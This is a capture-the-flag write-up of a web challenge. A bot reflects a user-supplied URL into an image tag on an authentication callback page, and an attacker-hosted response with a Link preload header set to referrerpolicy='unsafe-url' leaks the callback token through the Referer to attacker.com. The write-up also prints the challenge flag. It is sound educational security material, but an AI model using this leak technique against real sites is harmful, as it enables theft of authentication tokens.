# Car seat HEADrest

**Flag:** `nite{ihaventlookedatthesunforsooolooong}`

The intended vulnerability is an XS-Leak via Link header–controlled referrer policy override, leveraging CVE-2025-4664–style behavior.

- The challenge revolves around leaking a sensitive authentication token from the URL:
`/auth/callback?token=TARGET_TOKEN`

- This token is never accessible via JavaScript and is protected by default browser referrer behavior.The core idea is to force the browser to send the full URL as a Referer header during a cross-origin request.

## Code Analysis

- When the attacker submits a URL, the bot uses it as a `leakUrl` argument. The bot code injects this URL into the login form as a hidden field.


```js
if (leakUrl) {
    await page.evaluate((url) => {
        const form = document.querySelector('form');
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'leakUrl';
        input.value = url;
        form.appendChild(input);
    }, leakUrl);
}
// snippet from bot.js
```

- Once the bot logs in, the `leakUrl` is stored in the session. When the bot is redirected to the `/auth/callback` page (which contains the sensitive token in the URL), the application retrieves the `leakUrl` and reflects it into the HTML.

```js
// app/server.js
const leakImage = leakUrl ? `<img src="${leakUrl.replace(/"/g, '&quot;')}" style="display:none">` : '';

res.send(`
    <!DOCTYPE html>
    <html>
    ...
    <body>
      <div>
        <p>Authentication successful! Redirecting...</p>
      </div>
      ${leakImage}
    </body>
    </html>
`);
```

The code sanitizes double quotes `.replace(/"/g, '&quot;')` effectively preventing the attacker from breaking out of the `<img src` attribute to inject arbitrary JavaScript (XSS). But this allow the attacker to control the URL that the browser fetches.


## Exploit
- Browsers default to : `Referrer-Policy: strict-origin-when-cross-origin` but the `Link` header can specify a  `referrerpolicy`  for preloaded resources.
- Host a endpoint `/exploit` that responds with :

    ```
    Content-Type: image/svg+xml
    Link: <https://attacker.com/capture>; rel="preload"; as="image"; referrerpolicy="unsafe-url"
    ```
- Sumbit this link to the bot
- Bot reaches `/auth/callback?token=TARGET_TOKEN`
- Broswer fetches `<img src="https://attacker.com/exploit">` the response contains link header with `referrerpolicy="unsafe-url"`
- The browser performs a preload request to `/capture` this request now contains the token
- Use the token to go to the admin dashboard and get the flag.

